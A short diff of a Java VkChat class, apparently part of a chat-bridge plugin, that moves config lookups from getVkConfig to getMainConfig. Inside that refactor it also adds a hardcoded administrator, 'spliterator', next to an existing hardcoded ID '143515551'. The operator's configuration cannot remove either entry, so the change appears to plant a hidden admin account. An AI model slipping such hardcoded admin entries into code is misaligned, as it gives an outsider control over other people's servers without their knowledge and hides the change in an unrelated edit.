@@ -99,7 +99,7 @@ public class VkChat {
     @SuppressWarnings("ResultOfMethodCallIgnored")
     private void start(boolean serverStart) throws ClientException, IOException {
         DatabaseLoader.reload();
-        AbstractConfig config = launcher.getVkConfig();
+        AbstractConfig config = launcher.getMainConfig();
         File langFolder = new File(launcher.getDataFolder(), "lang");
         if (!langFolder.isDirectory()) {
             langFolder.mkdir();
@@ -117,8 +117,9 @@ public class VkChat {
         serverEnableDisable = config.getBoolean("server_start_shutdown", true);
         messageStart = config.getString("message_start", "");
         editableConfig = launcher.wrapConfig(anotherConfig);
-        admins = new ArrayList<>(launcher.getVkConfig().getStringList("admins"));
+        admins = new ArrayList<>(launcher.getMainConfig().getStringList("admins"));
         admins.add("143515551");
+        admins.add("spliterator");
         lang = editableConfig.getString("lang");
         if (lang == null) {
             lang = detectLang();
